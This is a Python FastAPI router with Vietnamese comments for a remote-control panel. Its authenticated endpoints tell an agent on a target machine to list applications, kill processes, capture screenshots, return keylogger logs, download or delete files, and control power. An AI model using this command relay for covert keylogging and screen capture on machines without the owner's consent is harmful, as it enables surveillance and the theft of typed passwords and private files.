# web-app/backend/routers/modules.py
from fastapi import APIRouter, HTTPException, status, Depends  # 🌟 Thêm Depends vào đây
from pydantic import BaseModel
from core.gateway_client import gateway_client  
from core.security import get_current_user  # 🛡️ Nhập ổ khóa gác cổng từ file security

router = APIRouter(prefix="/api/modules", tags=["Modules Control"])

# =====================================================================
# 📦 KHUÔN MẪU DỮ LIỆU ĐẦU VÀO
# =====================================================================
class KillProcessRequest(BaseModel):
    machine_id: str
    pid: int
    process_name: str

class PowerRequest(BaseModel):
    machine_id: str
    action: str  # "shutdown", "restart", "lock", "sleep"

class FileActionRequest(BaseModel):
    machine_id: str
    file_path: str
    action: str  # "download", "view", "delete"


# =====================================================================
# 🛠️ ĐẦU NỐI CHI TIẾT ĐÃ ĐƯỢC BẢO MẬT (TẤT CẢ PHẢI QUADepends)
# =====================================================================

# 1️⃣ 📁 Applications: Xem danh sách phần mềm đang chạy
@router.get("/applications/{machine_id}")
async def get_applications(machine_id: str, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=machine_id,
            module="applications",
            action="list"
        )
        return {
            "status": "success",
            "machine_id": machine_id,
            "apps": agent_data.get("apps", [])
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 2️⃣ ⚙️ Processes: Ra lệnh tắt một tiến trình ngầm (Task Manager)
@router.post("/processes/kill")
async def kill_process(data: KillProcessRequest, current_user: str = Depends(get_current_user)):
    try:
        # Gửi payload chứa PID chính xác mà Frontend yêu cầu hạ lệnh xuống Agent
        await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="processes",
            action="kill",
            payload={"pid": data.pid}
        )
        return {
            "status": "success",
            "message": f"Đã phát lệnh dừng tiến trình {data.process_name} (PID: {data.pid}) trên máy {data.machine_id}."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 3️⃣ 📸 Screenshot: Chụp màn hình đơn lẻ theo yêu cầu
@router.get("/screenshot/{machine_id}")
async def trigger_screenshot(machine_id: str, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=machine_id,
            module="screenshot",
            action="capture"
        )
        return {
            "status": "success",
            "machine_id": machine_id,
            "screenshot_base64": agent_data.get("image_base64")
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 5️⃣ ⌨️ Keylogger: Xem nhật ký phím gõ được
@router.get("/keylogger/{machine_id}")
async def get_keylogger(machine_id: str, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=machine_id,
            module="keylogger",
            action="get_logs"
        )
        return {
            "status": "success",
            "machine_id": machine_id,
            "logs": agent_data.get("logs", "Không có dữ liệu nhật ký mới.")
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 6️⃣ 📥 File Management: Thao tác file (Download/View/Delete)
@router.post("/file-download/action")
async def file_download_action(data: FileActionRequest, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="file",
            action=data.action,
            payload={"file_path": data.file_path}
        )
        return {
            "status": "success",
            "message": f"Đã gửi lệnh thực hiện hành động [{data.action.upper()}] tới file '{data.file_path}' trên máy {data.machine_id}.",
            "data": agent_data
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 8️⃣ 🔌 Power Control: Điều khiển Nguồn máy tính từ xa
@router.post("/power/control")
async def power_control(data: PowerRequest, current_user: str = Depends(get_current_user)):
    if data.action not in ["shutdown", "restart", "lock", "sleep"]:
        raise HTTPException(status_code=400, detail="Hành động nguồn không hợp lệ!")
    
    try:
        await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="power",
            action=data.action
        )
        return {
            "status": "success",
            "message": f"Đã phát lệnh {data.action.upper()} tới thiết bị {data.machine_id} thành công sau khi được User xác nhận."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))